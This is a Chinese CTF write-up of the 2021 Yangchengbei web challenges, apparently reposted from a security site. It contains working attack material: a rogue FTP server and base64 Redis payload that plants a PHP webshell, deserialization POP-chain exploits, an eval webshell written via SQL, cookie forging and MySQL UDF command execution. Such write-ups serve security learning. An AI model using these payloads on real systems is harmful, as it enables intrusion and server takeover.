@@ -1,0 +1,509 @@
+# 羊城杯2021-web-wp
+
+阅读量 **327276**
+
+|评论 **1**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-09-18 10:00:35
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+## Cross The Side
+
+考察：Laravel cve
+
+之前用之前的cve没有打通，可能是php.ini里面的配置文件大小不一样。
+
+<https://whoamianony.top/2021/01/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Laravel/Laravel%20Debug%20mode%20RCE%EF%BC%88CVE-2021-3129%EF%BC%89%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0/>
+
+<https://www.freebuf.com/articles/network/286132.html>
+
+看这个文章直接利用file_put_concent打ftp服务然后打内网的9000端口，这里自己测试了一下9000端口应该不是。
+
+那就是打redis 6379。
+
+所以思路就是我们自己搭建一个ftp服务。通过被动代理去发送数据。
+
+所以恶意的ftp.py，来自网上。。。。
+
+    
+    
+    import socket
+    def get(conn):
+        conn.send("220 (vsFTPd 3.0.3)\n")
+        print conn.recv(200)
+        conn.send("331 Please specify the password.\n")
+        print conn.recv(200)
+        conn.send("230 Login successful.\n")
+        print conn.recv(200)
+        conn.send("200 Switching to Binary mode.\n")
+        print conn.recv(200)
+        conn.send("213 3\n")
+        print conn.recv(200)
+        conn.send("229 Entering Extended Passive Mode (|||1337|)\n")
+        print conn.recv(200)
+        conn.send("150 Opening BINARY mode data connection for /test/test.php (3 bytes).\n")
+        conn.send("226 Transfer complete.\n")
+        print conn.recv(200)
+        conn.send("221 Goodbye.\n")
+        conn.close()
+    def put(conn):
+        conn.send("220 (vsFTPd 3.0.3)\n");
+        print conn.recv(20)
+        conn.send("331 Please specify the password.\n");
+        print conn.recv(20)
+        conn.send("230 Login successful.\n")
+        print conn.recv(20)
+        conn.send("200 Switching to Binary mode.\n");
+        print conn.recv(20)
+        conn.send("550 Could not get file size.\n");
+        print conn.recv(20)
+        conn.send("227 127,0,0,1,0,6379\n")
+        print conn.recv(20)
+        conn.send("227 127,0,0,1,0,6379\n")
+        print conn.recv(20)
+        conn.send("150 Ok to send data.\n")
+        conn.send("226 Transfer complete.\n")
+        print conn.recv(20)
+        conn.send("221 Goodbye.\n");
+        conn.close()
+    host = '0.0.0.0'
+    port = 23
+    sk = socket.socket()
+    sk.bind((host, port))
+    sk.listen(5)
+    conn,address = sk.accept()
+    get(conn)
+    conn,address=sk.accept()
+    put(conn)
+    
+    
+    
+    import socket
+    import base64
+    host = '0.0.0.0'
+    port = 1337
+    sk = socket.socket()
+    sk.bind((host, port))
+    sk.listen(5)
+    
+    conn,address = sk.accept()
+    conn.send(base64.b64decode("KjENCiQ4DQpmbHVzaGFsbA0KKjMNCiQzDQpzZXQNCiQxDQoxDQokMzQNCgoKPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+CgoNCio0DQokNg0KY29uZmlnDQokMw0Kc2V0DQokMw0KZGlyDQokOA0KL3Zhci93d3cNCio0DQokNg0KY29uZmlnDQokMw0Kc2V0DQokMTANCmRiZmlsZW5hbWUNCiQ5DQpzaGVsbC5waHANCioxDQokNA0Kc2F2ZQ0KCg=="))
+    conn.close()
+    
+
+生成我们的payload，在进行base64加密
+
+![](https://p4.ssl.qhimg.com/t018a0cf67313f340df.png)
+
+直接getflag
+
+![](https://p2.ssl.qhimg.com/t01874188b36fd7990b.png)
+
+## 非预期Only 4
+
+代码审计
+
+    
+    
+    <?php
+    highlight_file('index.php');
+    error_reporting(0);
+    $gwht= $_GET["gwht"];
+    $ycb= $_GET["ycb"];
+    if(preg_match("/flag/",$gwht)){
+        die('hack' );
+    }
+    if(preg_match("/secret/",$gwht)){
+        die('hack' );
+    }
+    include($gwht);
+    if(isset($ycb)){
+        $url = parse_url($_SERVER['REQUEST_URI']);
+        parse_str($url['query'],$query);
+        foreach($query as $value){
+            if (preg_match("/Flag/",$value)) {
+                die('not hit');
+                exit();
+            }
+        }
+        $YCB = unserialize($ycb);
+    }else{
+        echo "what are you doing";
+    }
+    ?>
+    
+
+发现存在有一个文件包含可以控制，那我们去读一下文件？
+
+![](https://p2.ssl.qhimg.com/t01b2f273cc1f2bb7bf.png)
+
+发现存在/proc/self/fd/8里面是日志，所以我们直接文件包含getshell。但是因为自己没有写好代码导致不能使用。那么正常解呢？
+
+## 预期Only 4
+
+index.php
+
+    
+    
+    <?php
+    highlight_file('index.php');
+    error_reporting(0);
+    $gwht= $_GET["gwht"];
+    $ycb= $_GET["ycb"];
+    if(preg_match("/flag/",$gwht)){
+        die('hack' );
+    }
+    if(preg_match("/secret/",$gwht)){
+        die('hack' );
+    }
+    include($gwht);
+    if(isset($ycb)){
+        $url = parse_url($_SERVER['REQUEST_URI']);
+        parse_str($url['query'],$query);
+        foreach($query as $value){
+            if (preg_match("/Flag/",$value)) {
+                die('not hit');
+                exit();
+            }
+        }
+        $YCB = unserialize($ycb);
+    }else{
+        echo "what are you doing";
+    }
+    ?>
+    
+
+盲猜了一个serialize.php，用gwht去读
+
+    
+    
+    http://192.168.40.239:8000/?gwht=php://filter/read=convert.base64-encode/resource=serialize.php
+    
+
+base64解码后得到serialize.php的源码
+
+链子很简单，和前几天成理招新赛不能说一模一样，只能说完全一致了
+
+    
+    
+    //POC
+    <?php
+    class start_gg
+    {
+        public $mod1;
+        public $mod2;
+        public function __construct()
+        {
+            $this->mod1=new Call();
+        }
+    }
+    class Call
+    {
+        public $mod1;
+        public $mod2;
+        public function __construct()
+        {
+            $this->mod1=new funct();
+        }
+    }
+    class funct
+    {
+        public $mod1;
+        public $mod2;
+        public function __construct()
+        {
+            $this->mod1=new func();
+        }
+    }
+    class func
+    {
+        public $mod1;
+        public $mod2;
+        public function __construct()
+        {
+            $this->mod1=new string1();
+        }
+    }
+    class string1
+    {
+        public $str1;
+        public $str2;
+        public function __construct()
+        {
+            $this->str1=new GetFlag();
+        }
+    }
+    class GetFlag
+    {
+        public function get_flag()
+        {
+            echo highlight_file('secret.php');
+        }
+    }
+    $a = new start_gg();
+    echo urlencode(serialize($a));
+    ?>
+    
+
+链子很简单，和前几天成理招新赛不能说一模一样，只能说完全一致了
+
+另外`$url = parse_url($_SERVER['REQUEST_URI'])`可以在path中加入`/`来绕过
+
+<https://www.xmsec.cc/n1ctf-web-review/#funning-eating-cms>
+
+最终的poc为
+
+    
+    
+    http://192.168.40.239:8000///index.php?gwht=serialize.php&ycb=O%3A8%3A%22start_gg%22%3A2%3A{s%3A4%3A%22mod1%22%3BO%3A4%3A%22Call%22%3A2%3A{s%3A4%3A%22mod1%22%3BO%3A5%3A%22funct%22%3A2%3A{s%3A4%3A%22mod1%22%3BO%3A4%3A%22func%22%3A2%3A{s%3A4%3A%22mod1%22%3BO%3A7%3A%22string1%22%3A2%3A{s%3A4%3A%22str1%22%3BO%3A7%3A%22GetFlag%22%3A0%3A{}s%3A4%3A%22str2%22%3BN%3B}s%3A4%3A%22mod2%22%3BN%3B}s%3A4%3A%22mod2%22%3BN%3B}s%3A4%3A%22mod2%22%3BN%3B}s%3A4%3A%22mod2%22%3BN%3B}
+    
+
+到最后一层secret.php
+
+    
+    
+    <?php
+    error_reporting(0);
+    if(strlen($_GET['SXF'])<5){
+        echo shell_exec($_GET['SXF']);
+    }
+    
+
+4字符RCE，可以参考陆队这篇文章
+
+<https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#Example-3-%E5%9B%9B%E5%AD%97%E7%BB%95%E8%BF%87-HITCON-2017-BabyFirst-Revenge-v2>
+
+本来是想弹个shell出来，结果一直打不通，一直卡到晚上，容器都重启了两遍
+
+最后因为这里是有回显的，没必要执着于弹shell，直接用这个trick
+
+![](https://p2.ssl.qhimg.com/t01947fe24ad16c4d98.png)
+
+本地实验完之后，第二次重置容器后直接全盘读取，然后再搜SangFor
+
+    
+    
+    >cat
+    * /*
+    
+
+![](https://p2.ssl.qhimg.com/t01ae06ac20124f4b12.png)
+
+这里简单的说一下其实后面的思路和自己之前出的题差不多。
+
+<https://github.com/Firebasky/ctf-Challenge/blob/main/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2020.8.11-ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-nl.md>
+
+## Checkin_Go
+
+考察：伪随机数
+
+<https://github.com/EddieIvan01/secure-cookie-faker>
+
+发现下面函数每次生成是一样，
+
+    
+    
+    func randomChar(l int) []byte {
+        output := make([]byte, l)
+        rand.Read(output)
+        return output
+    }
+    
+
+![](https://p1.ssl.qhimg.com/t012f3169b62b53c193.png)
+
+key我们在通过faker工具处理的时候使用$(printf’\x’) 之前华为xctf 考察过
+
+    
+    
+    ./secure-cookie-faker enc -n "o" -k "$(printf '\x52\xfd\xfc\x07\x21\x82\x65\x4f\x16\x3f\x5f\x0f\x9a\x62\x1d\x72')" -o "{checkPlayerMoney[string]: OmHQ8pB2diwXKx3RMhJJUw[string],hsh[string]: 0a7610[string],nowMoney[string]: 200000[int],checkNowMoney[string]: JkeLNs0tAng7rDdgtr1nDQ[string],uname[string]: admin[string],playerMoney[string]: 5000[int]}"
+    
+    {checkPlayerMoney[string]: OmHQ8pB2diwXKx3RMhJJUw[string],hsh[string]: 0a7610[string],nowMoney[string]: 200000[int],checkNowMoney[string]: JkeLNs0tAng7rDdgtr1nDQ[string],uname[string]: admin[string],playerMoney[string]: 5000[int]}
+    
+
+![](https://p4.ssl.qhimg.com/t01ed076a55d2789977.png)
+
+然后登录成功一次一次的添加钱发现存在一个溢出。溢出成功，之后直接buy
+
+![](https://p3.ssl.qhimg.com/t012185309f72f52672.png)
+
+![](https://p0.ssl.qhimg.com/t015d95f10fc1e62d30.png)
+
+## NO SQL
+
+考察：NO SQL注入
+
+安全客原文章：[https://www.anquanke.com/post/id/241113#h3-6，相当于复现一下题23333。](https://www.anquanke.com/post/id/241113#h3-6%EF%BC%8C%E7%9B%B8%E5%BD%93%E4%BA%8E%E5%A4%8D%E7%8E%B0%E4%B8%80%E4%B8%8B%E9%A2%9823333%E3%80%82)
+
+注入获得token，之后修改密码进行登录。
+
+![](https://p3.ssl.qhimg.com/t01c100b5fdfc946d1a.png)
+
+在其中写入一句话，然后蚁剑连接。
+
+![](https://p0.ssl.qhimg.com/t014cc032509d9b7c99.png)
+
+在执行命令的时候发现不了，然后就使用ffi bypass df ，寻找flag。在根目录下有flag,不过没有权限。
+
+本来想在tmp下上传脚本提权的，然后发现在/tmp目录下有奇奇怪怪的文件试一试找flag。果然。。。。。
+
+![](https://p1.ssl.qhimg.com/t0155ad3370f8a2e987.png)
+
+不过提权，在ctf中可能只是suid和path这些提权了吧。没有成功。。。
+
+## Curl
+
+给了common.php文件，然后在扫描一下发现有app,于是查看。
+
+![](https://p2.ssl.qhimg.com/t012555289f520d90f3.png)
+
+![](https://p0.ssl.qhimg.com/t0125fc554b4214c008.png)
+
+![](https://p1.ssl.qhimg.com/t01103565438156720b.png)
+
+发现密码，直接登录。。之后并没有利用点，就去测试admin.php,就一个反序列化漏洞点，所以需要我们pop..
+
+然后就在common.php里面寻找pop。
+
+    
+    
+    <?php
+    class User
+    {
+        public $username;
+        public $session_id='1';
+        public function __construct($username)
+        {
+            $this->username=$username;
+        }
+    }
+    class cache_parser{
+        public $user;
+        public $default_handler;
+        public $logger;
+        public function __construct($cache_parser,$url)
+        {
+            $this->user = new User('');
+            $this->logger = $cache_parser;
+            $this->default_handler = new file_request($url);
+        }
+    }
+    class file_request{
+        public $url;
+        public function __construct($url)
+        {
+            $this->url=$url;
+        }
+    }
+    $exp = new User(
+            new cache_parser(
+                new cache_parser('','file:///etc/passwd'),
+                    ''));
+    
+    echo (serialize($exp));
+    
+
+![](https://p0.ssl.qhimg.com/t01380033fd088ea5e0.png)
+
+直接看一下调用栈吧
+
+    
+    
+    common.php:208, file_request->request()
+    common.php:224, file_request->__invoke()
+    common.php:158, cache_parser->__call()
+    common.php:173, cache_parser->write_log()
+    common.php:173, cache_parser->save_user_info()
+    common.php:149, cache_parser->__toString()
+    common.php:29, User->__wakeup()
+    common.php:251, unserialize()
+    common.php:251, {main}()
+    
+
+之后就是读config.php文件,存在mysql然后大概就是写shell了。通过ssrf协议去写shell.
+
+    
+    
+    select '<?php @eval($_POST[1])?>' into outfile '/var/www/html/1.php'
+    
+
+发现写入不了。。。
+
+![](https://p5.ssl.qhimg.com/t01d41e7e492af0cb41.png)
+
+其他思路，前几天我们省赛有一个udf提权的，于是来试一试。
+
+<https://blog.csdn.net/qq_33020901/article/details/78827375>
+
+<https://www.sqlsec.com/tools/udf.html>
+
+![](https://p3.ssl.qhimg.com/t0164331e62c865388d.png)
+
+    
+    
+    create function sys_eval returns string soname 'udf.so';
+    
+
+![](https://p5.ssl.qhimg.com/t01b8f18e3afcf9928a.png)
+
+之后就执行命令。。直接获得flag
+
+![](https://p0.ssl.qhimg.com/t01017ceb7289d5b01a.png)
+
+![](https://p4.ssl.qhimg.com/t01dd712bb1c7f66808.png)
+
+## Shop System
+
+java
+
+之前一直心心念念的期待java题，结果这次啥都没有，思路都没有，功能点也少源代码也没用感觉更像是《渗透》
+
+只是github上找到了一部分源代码。<https://github.dev/NiceSeason/gulimall-learning>
+
+然后就审啊审的。。。。。。。不会了。。
+
+## 总结
+
+java太难了。。。。。。。
+
+![](https://p3.ssl.qhimg.com/t01c19f1e486a1ab948.png)
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Firebasky** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/253051](/post/id/253051)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CTF](/tag/CTF)
+  * [Web安全](/tag/Web安全)
+
+ **+1** __14赞
+
+ __收藏
+
+![](https://p2.ssl.qhimg.com/t01e7d29c65e1725143.png) Firebasky
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
